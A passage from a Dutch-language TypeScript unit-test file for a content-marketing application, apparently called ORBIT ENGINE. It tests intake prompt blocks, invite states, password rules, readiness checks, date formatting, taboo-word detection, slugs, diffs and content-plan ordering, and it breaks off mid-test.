  // dan blijft dat veld voorgoed leeg.
  const gezet = consultantFields({
    name: "Van Mossel",
    aliases: ["Van Mossel Automotive"],
    industry: "",
    products: [],
    service_scope: null,
    intake_description: "   ",
  });
  ok("een getypte naam telt", gezet.includes("name"));
  ok("een gevulde lijst telt", gezet.includes("aliases"));
  ok("een lege tekst niet", !gezet.includes("industry"));
  ok("een lege lijst niet", !gezet.includes("products"));
  ok("null niet", !gezet.includes("service_scope"));
  ok("en alleen spaties ook niet", !gezet.includes("intake_description"));
  // Wat niet bewerkbaar is, hoort er ook niet in: `url` en `status` zijn geen
  // velden die een klant later mag corrigeren.
  ok(
    "en een niet-bewerkbaar veld komt er niet in",
    consultantFields({ url: "https://voorbeeld.nl", status: "bezig" }).length === 0,
  );
});

group("een aanname is geen feit, ook niet in de prompt (fase 2)", () => {
  // ⚠️ Het blok zei tegen het model "RESPECTEER dit", voor álles wat er stond.
  // Dat is goed voor wat de klant zelf zei en verkeerd voor wat de consultant
  // vóór het eerste contact invulde: die aanname legde het marktonderzoek stil,
  // want het model mag een klantwaarde niet tegenspreken.
  const blok = buildIntakeBlock({
    name: "Van Mossel",
    industry: "autodealer",
    competitors: ["Van den Udenhout"],
    serviceScope: "lokaal",
    sources: {
      name: "klant",
      industry: "consultant",
      competitors: "consultant",
      service_scope: "gesprek",
    },
  });

  ok("er staan twee blokken in", blok.includes("VASTGESTELD") && blok.includes("VÓÓR het gesprek"));
  const vastgesteld = blok.slice(blok.indexOf("VASTGESTELD"), blok.indexOf("VÓÓR het gesprek"));
  const aanname = blok.slice(blok.indexOf("VÓÓR het gesprek"));
  ok("wat de klant zei staat bij het vastgestelde", vastgesteld.includes("Van Mossel"));
  ok("de gespreksuitkomst ook", vastgesteld.includes("Bereik: lokaal"));
  ok("de aanname van de adviseur staat apart", aanname.includes("autodealer"));
  ok("met de concurrenten erbij", aanname.includes("Van den Udenhout"));
  ok(
    "en het model mag die tegenspreken",
    aanname.includes("niet als feit") && aanname.includes("eigen bevinding"),
  );
  ok("terwijl het vastgestelde gerespecteerd moet worden", vastgesteld.includes("RESPECTEER"));

  // Geen herkomst bekend = bevestigd. Een aanname per ongeluk als feit
  // behandelen kost een verrijking; een feit per ongeluk als aanname laat het
  // model de klant tegenspreken, en dat is de duurdere fout.
  const zonderHerkomst = buildIntakeBlock({ name: "Van Mossel", industry: "autodealer" });
  ok("zonder herkomst geldt alles als vastgesteld", zonderHerkomst.includes("VASTGESTELD"));
  ok("en staat er geen aannameblok", !zonderHerkomst.includes("VÓÓR het gesprek"));

  // Alleen aannames: dan hoort het vastgestelde blok er niet te staan, anders
  // leest het model een kop zonder inhoud.
  const alleenAanname = buildIntakeBlock({
    industry: "autodealer",
    sources: { industry: "consultant" },
  });
  ok("alleen aannames levert alleen dat blok", !alleenAanname.includes("VASTGESTELD"));
  ok("een leeg profiel levert geen blok", buildIntakeBlock({}) === "");
  ok("en geen intake ook niet", buildIntakeBlock() === "");
  // Een leeg veld hoort nergens: "Branche: " is een regel zonder informatie.
  ok(
    "lege velden vallen weg",
    !buildIntakeBlock({ name: "Van Mossel", industry: "", products: [] }).includes("Branche"),
  );
});

group("uitnodigingen: de vier eindtoestanden", () => {
  const nu = new Date("2026-08-10T12:00:00Z");
  const basis = { expires_at: "2026-08-24T12:00:00Z", accepted_at: null, revoked_at: null };

  ok("een verse link is geldig", inviteState(basis, nu) === "geldig");
  ok("geen rij is ongeldig", inviteState(null, nu) === "ongeldig");
  ok(
    "over de datum heen is verlopen",
    inviteState({ ...basis, expires_at: "2026-08-01T12:00:00Z" }, nu) === "verlopen",
  );
  ok(
    "al geaccepteerd is gebruikt",
    inviteState({ ...basis, accepted_at: "2026-08-05T12:00:00Z" }, nu) === "gebruikt",
  );

  // ⚠️ De volgorde is de bedoeling. Een INGETROKKEN link mag nooit als "al
  // gebruikt" lezen, want dan denkt de ontvanger dat hij een account heeft en
  // gaat hij een wachtwoord resetten dat niet bestaat.
  ok(
    "ingetrokken wint van gebruikt",
    inviteState(
      { ...basis, accepted_at: "2026-08-05T12:00:00Z", revoked_at: "2026-08-06T12:00:00Z" },
      nu,
    ) === "ongeldig",
  );
  ok(
    "ingetrokken wint ook van verlopen",
    inviteState(
      { ...basis, expires_at: "2026-08-01T12:00:00Z", revoked_at: "2026-08-06T12:00:00Z" },
      nu,
    ) === "ongeldig",
  );
  // De grens zelf: precies op de vervaldatum is hij verlopen.
  ok(
    "op het moment zelf is hij verlopen",
    inviteState({ ...basis, expires_at: nu.toISOString() }, nu) === "verlopen",
  );
});

group("wachtwoordregels", () => {
  // Precies die van Nova: rule8, ruleNumber, ruleUppercase. Drie, niet meer.
  ok("drie regels", passwordRules("").length === 3);
  ok("leeg voldoet aan niets", passwordRules("").every((r) => !r.ok));
  ok("acht tekens is genoeg lengte", passwordRules("abcdefgh")[0].ok === true);
  ok("zeven tekens niet", passwordRules("abcdefg")[0].ok === false);
  ok("cijfer wordt gezien", passwordRules("abcdefg1")[1].ok === true);
  ok("hoofdletter wordt gezien", passwordRules("Abcdefgh")[2].ok === true);
  ok("alledrie samen is goed", passwordOk("Wachtwoord1") === true);
  ok("zonder hoofdletter niet", passwordOk("wachtwoord1") === false);
  ok("zonder cijfer niet", passwordOk("Wachtwoorden") === false);
  ok("te kort niet", passwordOk("Aa1") === false);
});

group("wie mag uitnodigen", () => {
  // Een member kan meekijken en goedkeuren maar de kring niet uitbreiden. Bij
  // een bureau is dat het verschil tussen een collega en de contractpartij.
  ok("een accountbeheerder mag", mayInvite("admin", false) === true);
  ok("een gewoon lid mag niet", mayInvite("member", false) === false);
  ok("een beheerder van ORBIT ENGINE mag altijd", mayInvite(null, true) === true);
  ok("een lid van ORBIT ENGINE-staf ook", mayInvite("member", true) === true);
  ok("zonder rol en zonder staf niet", mayInvite(null, false) === false);
});

group("monthsSinceStart", () => {
  const nu = new Date("2026-08-10T12:00:00Z");

  // ⚠️ Besluit 7: doorlopend opzegbaar, dus NIET "contractmaand 4 van 12" zoals
  // bij Nova. De klant zit nergens aan vast, en een teller die zegt hoeveel hij
  // nog tegoed heeft zou dat suggereren.
  ok("de eerste maand is maand 1", monthsSinceStart({ started_at: "2026-08-01" }, nu) === 1);
  ok("zelfde dag is ook maand 1", monthsSinceStart({ started_at: "2026-08-10" }, nu) === 1);
  ok("een maand later is maand 2", monthsSinceStart({ started_at: "2026-07-10" }, nu) === 2);
  ok(
    "vóór de verjaardag van de maand telt hij nog niet mee",
    monthsSinceStart({ started_at: "2026-07-11" }, nu) === 1,
  );
  ok("over een jaargrens heen", monthsSinceStart({ started_at: "2025-08-10" }, nu) === 13);
  // Conventie 3: onbekend is een betere waarde dan een gok.
  ok("zonder startdatum geen getal", monthsSinceStart({ started_at: null }, nu) === null);
  ok(
    "een startdatum in de toekomst levert niets op",
    monthsSinceStart({ started_at: "2026-09-01" }, nu) === null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nIs het merkdossier af? (profile-readiness)");

group("assessReadiness", () => {
  const stap = (job: string, state: string) =>
    ({ job, label: job, state, result: null }) as never;

  // Alle acht taken gedaan, alles gevuld: dit is het moment waarop de
  // consultant het scherm mag delen.
  const compleet = {
    profileId: "test-profiel",
    steps: [
      stap("profile_discover", "klaar"),
      stap("profile_synthesis", "klaar"),
      stap("profile_offering", "klaar"),
      stap("profile_llm_baseline", "klaar"),
      stap("propose_topics", "klaar"),
      stap("technical_audit", "klaar"),
    ],
    pages: 31,
    offerings: 12,
    topics: 5,
    auditChecks: 9,
    baselineRows: 6,
    dossier: true,
    openFactRequests: 0,
    scopeKnown: true,
    scopeDetail: "Lokaal: Amersfoort",
  };

  const r = assessReadiness(compleet);
  ok("alles gevuld is compleet", r.compleet === true);
  ok("zeven onderdelen zijn verplicht", r.nodigAantal === 7);
  ok("en alle zeven staan er", r.klaarAantal === 7);
  ok("er loopt niets meer", r.loopt === false);
  ok("dus niets ontbreekt", r.ontbreekt.length === 0);
  ok(
    "de kop zegt dat je het gesprek in kunt",
    readinessHeadline(r, "Fysi-Unique").includes("compleet"),
  );

  // ⚠️ DE KERN: openstaande feitvragen mogen "compleet" NIET blokkeren.
  // Anders staat elk profiel eeuwig op 90% omdat de klant drie vragen niet
  // invulde, en dan betekent de melding niets meer.
  const metOpenVragen = assessReadiness({
    ...compleet,
    openFactRequests: 6,
  });
  ok(
    "open vragen blokkeren 'compleet' niet",
    metOpenVragen.compleet === true,
  );
  ok(
    "maar ze staan er wel als open punt",
    metOpenVragen.optioneelOpen.length === 1,
  );
  ok(
    "en de kop noemt ze als agenda, niet als fout",
    readinessHeadline(metOpenVragen, "X").includes("agenda voor het gesprek"),
  );

  // Draait er nog werk, dan is een lege kaart geen bevinding maar een
  // tussenstand. Zonder dit onderscheid geeft de app in de eerste zeven minuten
  // vals alarm.
  const loopt = assessReadiness({
    ...compleet,
    steps: [...compleet.steps.slice(0, 4), stap("propose_topics", "bezig")],
    topics: 0,
  });
  ok("een draaiende stap heet 'loopt'", loopt.loopt === true);
  ok(
    "en de rij staat op 'loopt', niet op 'leeg'",
    loopt.rows.find((x) => x.label === "Onderwerpen voorgesteld")?.state ===
      "loopt",
  );
  ok(
    "de kop meldt de tussenstand",
    readinessHeadline(loopt, "X").includes("nog bezig"),
  );

  // Echt mislukt: het onderzoek is klaar maar een verplicht onderdeel is leeg.
  const kapot = assessReadiness({ ...compleet, offerings: 0, topics: 0 });
  ok("een leeg verplicht onderdeel blokkeert", kapot.compleet === false);
  ok("en wordt bij naam genoemd", kapot.ontbreekt.length === 2);
  ok(
    "de kop zegt wat er mist",
    readinessHeadline(kapot, "X").includes("aanbod in kaart"),
  );

  // ── Het werkgebied blokkeert (spoor R6) ──────────────────────────────────
  //
  // ⚠️ Zonder `service_scope` vuurt de regionale promptregel niet, en dan krijgt
  // een Brabantse dealer vragen over heel Nederland. Op productie stond dit veld
  // bij vier van de negen profielen op null, waaronder Fysi-Unique. Precies het
  // merk waarvan de cijfers de hele vondst droegen.
  const zonderBereik = assessReadiness({ ...compleet, scopeKnown: false, scopeDetail: null });
  ok("een leeg werkgebied blokkeert het dossier", zonderBereik.compleet === false);
  ok(
    "en de kop noemt het bij naam",
    readinessHeadline(zonderBereik, "X").includes("werkgebied vastgesteld"),
  );
});

group("scopeSummary (spoor R6)", () => {
  ok("lokaal met plaatsen is bekend", scopeSummary("lokaal", ["Breda", "Oss"]).known);
  ok(
    "en toont ze, zodat de consultant ziet waarop gemeten wordt",
    scopeSummary("lokaal", ["Breda", "Oss"]).detail === "Lokaal: Breda, Oss",
  );

  // ⚠️ 'lokaal' zonder één regio telt als onbekend, want dat is precies wat
  // `isLokaal()` ervan maakt: die eist bereik én regio. Zou dit als "bekend"
  // gelden, dan meldt het scherm groen terwijl de promptregel niet vuurt.
  ok("lokaal zonder regio is niet bekend", !scopeSummary("lokaal", []).known);
  ok("lege regio's tellen niet mee", !scopeSummary("lokaal", ["", "  "]).known);

  ok("landelijk is een echt antwoord", scopeSummary("landelijk", []).known);
  ok("internationaal ook", scopeSummary("internationaal", []).known);

  // Conventie 3: onbekend is een echte waarde en geen gok naar 'landelijk'.
  ok("null is onbekend", !scopeSummary(null, []).known);
  ok("en levert geen detailregel op", scopeSummary(null, []).detail === null);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nGetallen, datums en relatieve tijd (H.60/H.61/H.62)");

group("formatNumber", () => {
  ok("duizendtal met punt", formatNumber(1248) === "1.248");
  ok("klein getal ongewijzigd", formatNumber(7) === "7");
});

group("formatDateShort/Long", () => {
  const iso = "2026-08-06T10:00:00Z";
  ok("kort heeft geen jaar", !formatDateShort(iso).includes("2026"));
  ok("lang heeft wel een jaar", formatDateLong(iso).includes("2026"));
  ok("lang spelt de maand voluit", formatDateLong(iso).toLowerCase().includes("augustus"));
});

group("formatRelativeTime", () => {
  const nu = new Date();
  const dagenGeleden = (n: number) => new Date(nu.getTime() - n * 24 * 60 * 60 * 1000).toISOString();
  ok("vandaag", formatRelativeTime(nu.toISOString()) === "vandaag");
  ok("gisteren", formatRelativeTime(dagenGeleden(1)) === "gisteren");
  ok("3 dagen geleden", formatRelativeTime(dagenGeleden(3)) === "3 dagen geleden");
  ok("2 weken geleden", formatRelativeTime(dagenGeleden(14)) === "2 weken geleden");
  ok("ver terug valt terug op een datum", formatRelativeTime(dagenGeleden(90)).includes("2026"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nTone-of-voice-schuiven (migratie 0045, C.28)");

group("describeToneSliders", () => {
  ok("niets ingesteld geeft lege string", describeToneSliders({ formality: null, energy: null, complexity: null, humor: null }) === "");
  ok(
    "één slider geeft één zin",
    describeToneSliders({ formality: 1, energy: null, complexity: null, humor: null }).includes("informeel"),
  );
  const alle = describeToneSliders({ formality: 3, energy: 3, complexity: 1, humor: 3 });
  ok("formeel", alle.includes("formeel") && !alle.includes("informeel"));
  ok("energiek", alle.includes("energiek"));
  ok("eenvoudig", alle.includes("eenvoudig"));
  ok("speels", alle.includes("speels"));
});

group("clampToneSlider", () => {
  ok("0 klemt naar 1", clampToneSlider(0) === 1);
  ok("2 blijft 2", clampToneSlider(2) === 2);
  ok("5 klemt naar 3", clampToneSlider(5) === 3);
  ok("niet-getal geeft null", clampToneSlider("abc") === null);
  ok("leeg geeft null", clampToneSlider("") === null);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nWaarom een contentversie bestaat (C.24)");

group("versionReasonLabel", () => {
  ok(
    "versie 1 is altijd origineel",
    versionReasonLabel({ version: 1, revisionNote: "iets", editedByUser: true }).includes("ORBIT ENGINE geschreven"),
  );
  ok(
    "door de klant bewerkt wint van een oud verzoek",
    versionReasonLabel({ version: 2, revisionNote: "maak het korter", editedByUser: true }).includes("bewerkt"),
  );
  ok(
    "een verzoek zonder eigen bewerking",
    versionReasonLabel({ version: 2, revisionNote: "maak het korter", editedByUser: false }).includes("herschreven"),
  );
  ok(
    "geen verzoek en geen bewerking komt uit de kritiekronde",
    versionReasonLabel({ version: 2, revisionNote: null, editedByUser: false }).includes("eigen kritiekronde"),
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nVerboden woorden, deterministisch (migratie 0045, C.29)");

group("checkTabooWords", () => {
  const leeg = checkTabooWords("Wij zijn gratis en de beste.", [], []);
  ok("geen verboden lijst = niets gevonden", leeg.found.length === 0);

  const schoon = checkTabooWords("Wij helpen je snel en persoonlijk.", [], ["gratis", "beste"]);
  ok("schone tekst blijft schoon", schoon.found.length === 0 && schoon.issues.length === 0);

  const vuil = checkTabooWords("Bij ons is alles gratis, wij zijn de beste.", [], ["gratis", "beste"]);
  ok("vindt beide verboden woorden", vuil.found.length === 2, vuil.found.join(","));
  ok("levert een verbeterpunt op", vuil.issues.length === 1);

  const woordgrens = checkTabooWords("Onze specialiteit is uitgebreide zorg.", [], ["breid"]);
  ok(
    "woordgrens: 'breid' matcht niet binnen 'uitgebreide'",
    woordgrens.found.length === 0,
  );

  const inFaq = checkTabooWords("Nette tekst.", [{ q: "Is het gratis?", a: "Ja, altijd gratis." }], ["gratis"]);
  ok("verboden woord in de FAQ telt ook mee", inFaq.found.length === 1);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nVoorgestelde URL van een pagina (content-editie, slug.ts)");

group("slugFrom, suggestedPath, resolvedContentUrl", () => {
  ok("gewone titel", slugFrom("Wat kost een keukenrenovatie?") === "wat-kost-een-keukenrenovatie");
  ok("diakrieten weg, letters blijven", slugFrom("Café en Wéér") === "cafe-en-weer");
  ok("lege titel krijgt een terugval", slugFrom("   ") === "nieuwe-pagina");
  ok("extreem lange titel wordt afgekapt", slugFrom("a".repeat(200)).length <= 60);

  ok("artikel krijgt het kennis-pad", suggestedPath("Titel", "article").startsWith("/kennis/"));
  ok("faq krijgt het veelgestelde-vragen-pad", suggestedPath("Titel", "faq").startsWith("/veelgestelde-vragen/"));
  ok("landing krijgt geen prefix", suggestedPath("Titel", "landing").match(/^\/[a-z0-9-]+$/) !== null);

  const gepubliceerd = resolvedContentUrl({
    publishedUrl: "https://klant.nl/live-pagina",
    action: "nieuw",
    existingUrl: null,
    siteUrl: "https://klant.nl",
    title: "Titel",
    type: "article",
  });
  ok("een gepubliceerde URL wint altijd", gepubliceerd.url === "https://klant.nl/live-pagina" && gepubliceerd.isReal);

  const verbeteren = resolvedContentUrl({
    publishedUrl: null,
    action: "verbeteren",
    existingUrl: "https://klant.nl/oude-pagina",
    siteUrl: "https://klant.nl",
    title: "Titel",
    type: "article",
  });
  ok(
    "zonder publicatie wint de bestaande URL bij een verbeterslag",
    verbeteren.url === "https://klant.nl/oude-pagina" && verbeteren.isReal,
  );

  const voorstel = resolvedContentUrl({
    publishedUrl: null,
    action: "nieuw",
    existingUrl: null,
    siteUrl: "https://klant.nl",
    title: "Nieuwe pagina",
    type: "article",
  });
  ok("zonder allebei is het een voorstel, geen feit", !voorstel.isReal && voorstel.url.includes("klant.nl"));
});

// doorloop-huyberts.md punt 3: de aanbevelingstitel is een opdracht aan de
// klant ("Publiceer een regionale pagina voor keukenrenovatie in Eindhoven"),
// geen paginatitel. displayTitle() laat de klant de meta_title zien die het
// model zelf schrijft, zonder content_pieces.title zelf aan te raken (die
// blijft de dedupe-sleutel van de schrijftaak, content.ts).
group("displayTitle", () => {
  ok(
    "de meta_title wint als hij er is",
    displayTitle({
      title: "Publiceer een regionale pagina voor keukenrenovatie in Eindhoven",
      meta_title: "Keukenrenovatie Eindhoven | Huyberts Keukens",
    }) === "Keukenrenovatie Eindhoven | Huyberts Keukens",
  );
  ok(
    "zonder meta_title valt hij terug op de aanbevelingstitel",
    displayTitle({ title: "Voeg een eerlijke pagina toe over kosten", meta_title: null }) ===
      "Voeg een eerlijke pagina toe over kosten",
  );
  ok(
    "een lege of alleen-witruimte meta_title telt ook als leeg",
    displayTitle({ title: "Aanbevelingstitel", meta_title: "   " }) === "Aanbevelingstitel",
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nVerschil tussen twee versies (content-editie, content-diff.ts)");

group("diffContent", () => {
  const gelijk = diffContent("precies dezelfde tekst", "precies dezelfde tekst");
  ok("identieke tekst geeft alleen 'gelijk'", gelijk.ops.every((o) => o.type === "gelijk"));

  const vervangen = diffContent("de prijs is laag", "de prijs is hoog");
  const verwijderdIdx = vervangen.ops.findIndex((o) => o.type === "verwijderd");
  const toegevoegdIdx = vervangen.ops.findIndex((o) => o.type === "toegevoegd");
  ok("een vervangen woord geeft verwijderd én toegevoegd", verwijderdIdx !== -1 && toegevoegdIdx !== -1);
  ok("verwijderd komt vóór toegevoegd", verwijderdIdx < toegevoegdIdx);

  const toevoeging = diffContent("start einde", "start midden einde");
  ok("een toegevoegd stuk in het midden", toevoeging.ops.some((o) => o.type === "toegevoegd" && o.text.includes("midden")));

  const eersteVersie = diffContent("", "helemaal nieuwe tekst");
  ok(
    "een lege oude tekst (eerste versie) is helemaal 'toegevoegd'",
    eersteVersie.ops.every((o) => o.type !== "verwijderd"),
  );

  ok("normale lengtes blijven op woordniveau", vervangen.granularity === "woord");

  const groteTekst = "woord ".repeat(500);
  const forceer = diffContent(groteTekst, groteTekst + "erbij", 10);
  ok("een lage maxProduct forceert de terugval naar alineaniveau", forceer.granularity === "alinea");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nFAQ-invoer valideren bij bewerken (content-editie, FaqEdit)");

group("FaqEdit", () => {
  const geldig = FaqEdit.safeParse([{ q: "Wat kost het?", a: "Vanaf 500 euro." }]);
  ok("een geldig paar gaat door", geldig.success);

  const legeVraag = FaqEdit.safeParse([{ q: "  ", a: "Antwoord." }]);
  ok("een lege vraag wordt geweigerd", !legeVraag.success);

  const teVeel = FaqEdit.safeParse(
    Array.from({ length: 13 }, (_, i) => ({ q: `Vraag ${i}`, a: "Antwoord." })),
  );
  ok("meer dan 12 paren wordt geweigerd", !teVeel.success);

  const teLang = FaqEdit.safeParse([{ q: "Vraag", a: "a".repeat(601) }]);
  ok("een te lang antwoord wordt geweigerd", !teLang.success);

  const metWitruimte = FaqEdit.safeParse([{ q: "  Vraag?  ", a: "  Antwoord.  " }]);
  ok(
    "omringende witruimte wordt getrimd",
    metWitruimte.success && metWitruimte.data[0].q === "Vraag?" && metWitruimte.data[0].a === "Antwoord.",
  );
});



group("het overzicht over twaalf maanden (plan-overview)", () => {
  // ⚠️ UX-review 24 augustus 2026. De weergave "Alles" was 120 kaarten van
  // gelijk gewicht over twaalf koppen die "Maand 1" tot "Maand 12" heetten,
  // zonder één kalendermaand en zonder aanwijzing waar "nu" was.

  const pg = (
    status: PlannedPageStatus,
    datum: string | null = null,
  ): { status: PlannedPageStatus; scheduled_for: string | null } => ({
    status,
    scheduled_for: datum,
  });

  // ── Het filter, één regel voor de lijst én voor de teller erboven ─────────
  ok(
    "wacht-op-jou is precies wat een handeling vraagt",
    matchesFilter(pg("ter_goedkeuring"), "actie") &&
      matchesFilter(pg("goedgekeurd"), "actie") &&
      !matchesFilter(pg("gepland"), "actie"),
  );
  ok(
    "staat-gepland pakt ook wat op dit moment geschreven wordt",
    matchesFilter(pg("gepland"), "gepland") && matchesFilter(pg("schrijven"), "gepland"),
  );
  ok(
    "alles is alles, ook wat mislukte",
    matchesFilter(pg("mislukt"), "alles") && matchesFilter(pg("afgewezen"), "alles"),
  );

  const lijst = [
    pg("ter_goedkeuring"),
    pg("goedgekeurd"),
    pg("gepland"),
    pg("schrijven"),
    pg("geplaatst"),
    pg("mislukt"),
  ];
  const tellers = filterCounts(lijst);
  ok(
    "elk tabblad draagt zijn eigen aantal",
    tellers.actie === 2 &&
      tellers.gepland === 2 &&
      tellers.live === 1 &&
      tellers.alles === 6,
  );
  // De teller boven het tabblad en de lijst eronder gebruiken dezelfde regel.
  // Een teller die anders telt dan de lijst toont is erger dan geen teller.
  ok(
    "de teller telt wat de lijst toont",
    tellers.actie === lijst.filter((p) => matchesFilter(p, "actie")).length,
  );
  ok(
    "een leeg tabblad is nul en niet niets",
    filterCounts([pg("gepland")]).live === 0,
  );

  // ── De kalendermaand, afgeleid uit de publicatiedata ──────────────────────
  ok(
    "de maand krijgt zijn echte naam uit de vroegste datum",
    monthCalendarLabel([pg("gepland", "2026-12-14"), pg("gepland", "2026-12-01")]) ===
      "december 2026",
  );
  // ⚠️ Een kale datum komt binnen als middernacht UTC. Met lokale getters wordt
  // 2026-12-01 in een negatieve tijdzone 30 november, en dan staat er november
  // boven een maand die in december publiceert.
  ok(
    "de eerste van de maand blijft die maand",
    monthCalendarLabel([pg("gepland", "2027-01-01")]) === "januari 2027",
  );
  // Conventie 3: onbekend is beter dan een gok. Zonder datum houdt de maand
  // gewoon zijn nummer.
  ok(
    "geen datum is geen gegokte maand",
    monthCalendarLabel([pg("gepland", null)]) === null &&
      monthCalendarLabel([]) === null,
  );
  ok(
    "een onleesbare datum telt niet mee",
    monthCalendarLabel([pg("gepland", "onzin"), pg("gepland", "2026-03-09")]) ===
      "maart 2026",
  );

  const nu = new Date("2026-09-10T12:00:00Z");
  ok(
    "de lopende maand herkent zichzelf",
    isCurrentMonth([pg("gepland", "2026-09-25")], nu) === true,
  );
  ok(
    "en de maand erna niet",
    isCurrentMonth([pg("gepland", "2026-10-01")], nu) === false,
  );

  // ── Welke maanden staan open? ─────────────────────────────────────────────
  const m = (
    id: string,
    zichtbaar: number,
    vraagtActie = false,
    isLopend = false,
  ) => ({ id, zichtbaar, vraagtActie, isLopend });

  ok(
    "een maand die iets van je vraagt staat open",
    openMonthIds([m("a", 10), m("b", 10, true), m("c", 10)]).join() === "b",
  );
  ok(
    "de lopende maand ook",
    openMonthIds([m("a", 10), m("b", 10, false, true)]).join() === "b",
  );
  ok(
    "een maand zonder zichtbare pagina's staat er niet",
    openMonthIds([m("leeg", 0, true), m("b", 3, true)]).join() === "b",
  );
  // ⚠️ De terugval telt. Klapt de regel alles dicht, dan kijkt de klant naar
  // een stapel gesloten regels zonder inhoud, en dat is even onbruikbaar als de
  // muur van 120 kaarten die het moest oplossen.
  ok(
    "staat er niets open, dan gaat de eerste maand alsnog open",
    openMonthIds([m("a", 10), m("b", 10)]).join() === "a",
  );
  ok("en bij een leeg plan blijft het leeg", openMonthIds([]).length === 0);

  // ── De eerstvolgende publicatie ───────────────────────────────────────────
  ok(
    "de eerstvolgende publicatie kijkt vooruit, niet achteruit",
    nextPublication(
      [pg("gepland", "2026-09-01"), pg("gepland", "2026-09-18"), pg("gepland", "2026-09-12")],
      nu,
    ) === "2026-09-12",
  );
  ok(
    "vandaag telt nog mee",
    nextPublication([pg("gepland", "2026-09-10")], nu) === "2026-09-10",
  );
  ok(
    "wat al live staat of uit het plan is, telt niet mee",
    nextPublication(
      [pg("geplaatst", "2026-09-11"), pg("afgewezen", "2026-09-12"), pg("gepland", "2026-09-20")],
      nu,
    ) === "2026-09-20",
  );
  ok(
    "een plan zonder toekomst geeft niets terug",
    nextPublication([pg("geplaatst", "2026-09-01")], nu) === null,
  );
  ok("de datum is leesbaar", formatDagNL("2026-09-12") === "12 september");
  ok("en onzin levert geen halve datum op", formatDagNL("onzin") === "");

  // ── De link naar de geschreven tekst ──────────────────────────────────────
  // ⚠️ Dit was het gat: de rij toonde een goedkeurknop en nergens de tekst,
  // terwijl `content_piece_id` er wél was en het leesscherm ook bestond.
  ok(
    "de link wijst naar de tekst onder de analyse van het onderwerp",
    contentHref("piece-1", "an-1") === "/analyses/an-1/bibliotheek/piece-1?van=plan",
  );
  // `?van=plan` is de herkomst uit `lib/origin.ts`: zonder die parameter komt
  // de klant na het lezen uit in de bibliotheek en niet in zijn plan.
  ok(
    "en draagt de herkomst mee, zodat de terugknop hierheen wijst",
    terugLink(leesHerkomst("plan"), "an-1", "merk-1").href ===
      "/merk/merk-1/strategie/plan",
  );
  ok(
    "zonder geschreven tekst is er geen link",
    contentHref(null, "an-1") === null && contentHref("piece-1", null) === null,
  );
});

group("de volgorde binnen een maand (plan-order)", () => {
  const p = (
    id: string,
    sort: number,
    datum: string | null,
    over: Partial<OrderablePage> = {},
  ): OrderablePage => ({
    id,
    sort_order: sort,
    scheduled_for: datum,
    is_buffer: false,
    status: "gepland",
    ...over,
  });

  const maand = [
    p("a", 0, "2026-09-01"),
    p("b", 1, "2026-09-03"),
    p("c", 2, "2026-09-05"),
    p("buffer", 3, null, { is_buffer: true }),
  ];

  const omhoog = swapWithNeighbour(maand, "b", "omhoog");
  ok("verplaatsen omhoog kan", omhoog.problem === null);
  // ⚠️ De plek én de datum wisselen. Alleen de plek zou een lijst opleveren
  // waarin de bovenste pagina later verschijnt dan de onderste.
  ok(
    "de pagina neemt de plek van zijn buurman over",
    omhoog.updates.find((u) => u.id === "b")?.sort_order === 0,
  );
  ok(
    "en ook zijn publicatiedatum",
    omhoog.updates.find((u) => u.id === "b")?.scheduled_for === "2026-09-01",
  );
  ok(
    "de buurman schuift precies de andere kant op",
    omhoog.updates.find((u) => u.id === "a")?.scheduled_for === "2026-09-03",
  );

  ok(
    "de bovenste kan niet verder omhoog",
    swapWithNeighbour(maand, "a", "omhoog").problem !== null,
  );
  // ⚠️ De buffer telt niet mee, anders zou "c" naar beneden wisselen met een
  // reserve en daarbij zijn publicatiedatum kwijtraken.
  ok(
    "de onderste echte pagina kan niet omlaag, de buffer telt niet mee",
    swapWithNeighbour(maand, "c", "omlaag").problem !== null,
  );

  // Een geplaatste pagina houdt zijn datum: die is de werkelijkheid geworden.
  const metGeplaatst = [
    p("x", 0, "2026-09-01", { status: "geplaatst" }),
    p("y", 1, "2026-09-03"),
  ];
  ok(
    "wisselen met een geplaatste pagina mag niet",
    swapWithNeighbour(metGeplaatst, "y", "omhoog").problem !== null,
  );
  ok(
    "en de geplaatste pagina zelf ook niet",
    swapWithNeighbour(metGeplaatst, "x", "omlaag").problem !== null,
  );

  // ⚠️ Migratie 0067: een zelfgekozen datum verhuist niet mee. Zou hij dat wel
  // doen, dan komt "deze pagina op 18 september, want dan is de beurs" bij de
  // buurman terecht, en dat is precies de pagina waarvoor die dag niet gold.
  const metEigenDatum = [
    p("m", 0, "2026-09-18", { scheduled_manual: true }),
    p("n", 1, "2026-09-25"),
  ];
  const gewisseld = swapWithNeighbour(metEigenDatum, "n", "omhoog");
  ok("wisselen mag nog steeds", gewisseld.problem === null);
  ok(
    "de plekken wisselen wel",
    gewisseld.updates.find((u) => u.id === "n")?.sort_order === 0,
  );
  ok(
    "maar de zelfgekozen datum blijft bij zijn eigen pagina",
    gewisseld.updates.find((u) => u.id === "m")?.scheduled_for === "2026-09-18",
  );
  ok(
    "en de buurman houdt ook de zijne",
    gewisseld.updates.find((u) => u.id === "n")?.scheduled_for === "2026-09-25",
  );

  ok(
    "canMove volgt dezelfde regel",
    canMove(maand, "b", "omhoog") && !canMove(maand, "a", "omhoog"),
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nHet CSM-paneel (fase 8, csm.ts)");


group("welke mislukkingen tellen nog? (unresolvedFailures)", () => {
  // ⚠️ HET ECHTE GEVAL, van productie, 11 augustus 2026.
  //
  // Het merkonderzoek van Van den Udenhout faalde op 5 en 6 augustus drie keer
  // met "You have no credits remaining", en op 9 augustus liep datzelfde
  // onderzoek gewoon door tot en met de synthese. Het CSM-paneel telde alle drie
  // de mislukkingen en zette het merk daardoor eeuwig bovenaan onder
  // "Vastgelopen". Een teller die nooit meer op nul komt, leer je negeren.
  const merk = "profile:78ddba40";
  const echt: JobOutcome[] = [
    { type: "profile_research", ownerKey: merk, status: "failed", at: "2026-08-05T21:30:15Z" },
    { type: "profile_research", ownerKey: merk, status: "failed", at: "2026-08-05T21:50:14Z" },
    { type: "profile_research", ownerKey: merk, status: "failed", at: "2026-08-06T21:49:18Z" },
